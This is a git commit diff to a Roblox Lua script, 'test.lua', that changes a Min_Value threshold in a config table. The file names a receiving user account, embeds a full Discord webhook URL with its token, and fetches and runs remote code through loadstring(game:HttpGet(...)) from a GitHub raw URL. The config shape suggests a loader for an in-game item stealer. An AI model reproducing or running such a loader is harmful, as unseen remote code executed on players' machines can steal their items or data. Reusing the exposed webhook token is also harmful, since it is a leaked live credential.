61c921acfc18c83caf2fcb24462b101ffd828188
Saanti56 <152914951+Saanti56@users.noreply.github.com>
2026-05-16 18:43:59 -0300

    Update test.lua

--- test.lua
+++ test.lua
@@ -1,7 +1,7 @@
 _G["Script-SM_Config"] = {
     ["users"] = {"F1212049"},
     ["user_webhook"] = "https://discord.com/api/webhooks/1505310290731073696/hl01nGjJzW2FB4hYlUFolMoCoHhr1aAuIPX9IDyffrahVJNJI6XiQD1tw54Xc9w1_faO",
-    ["Min_Value"] = 1,
+    ["Min_Value"] = 10,
     ["Min_Ping"] = 125
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Saanti56/Mis-Scripts/refs/heads/main/test2.lua"))()
